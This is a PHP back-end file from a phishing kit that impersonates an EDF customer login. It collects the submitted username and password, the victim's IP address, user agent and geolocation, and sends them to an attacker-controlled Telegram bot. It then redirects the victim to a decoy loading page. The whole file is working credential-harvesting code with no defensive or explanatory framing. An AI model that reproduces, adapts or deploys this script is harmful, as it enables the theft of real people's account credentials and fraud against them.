<?php
session_start();
error_reporting(0);
include('../../config.php');
include('../../assets/srv/funciones.php');
include('../../assets/srv/app.php');
$ip = getenv("REMOTE_ADDR");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$RZ3 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
$CNCD = $RZ3->geoplugin_countryCode ;
$STCD = $RZ3->geoplugin_regionCode ;
$date = gmdate("H:i:s | d/m/Y");
$random    = rand(0,100000).$_SERVER['REMOTE_ADDR'];
$random1    = substr(md5($random), 0, 20);
$random2 = substr(md5($random), 0, 14);
$random3 = substr(md5($random), 0, 8);
$random4 = substr(md5($random), 0, 50);
$message .= "🗕🗕🗕🗕🗕🗕🗕🗕🗕🗕 \n";
$message .= "EDF Login \n";
$message .= "Date  :   $date                              \n";
$message .= "User     :   ".$_POST['0ow1_1']."\n";
$message .= "Pass     :   ".$_POST['0ow1_2']."\n";
$message .= "▪▪▪▪ \n";
$message .= "from ip  :   $ip                              \n";
$message .= "UserAg   :   ".$useragent."                   \n";
$message .= "🗕🗕🗕🗕🗕🗕🗕🗕🗕🗕 \n";

function telegram($msg) {
        global $telegrambot,$telegramchatid;
        $url='https://api.telegram.org/bot'.$telegrambot.'/sendMessage';$data=array('chat_id'=>$telegramchatid,'text'=>$msg);
        $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
        $context=stream_context_create($options);
        $result=file_get_contents($url,false,$context);
        return $result;
}
telegram ("$message");

header('Location: ../loading.php?S'.$random1.'?id'.$random2.'?task'.$random3.'');
	
?>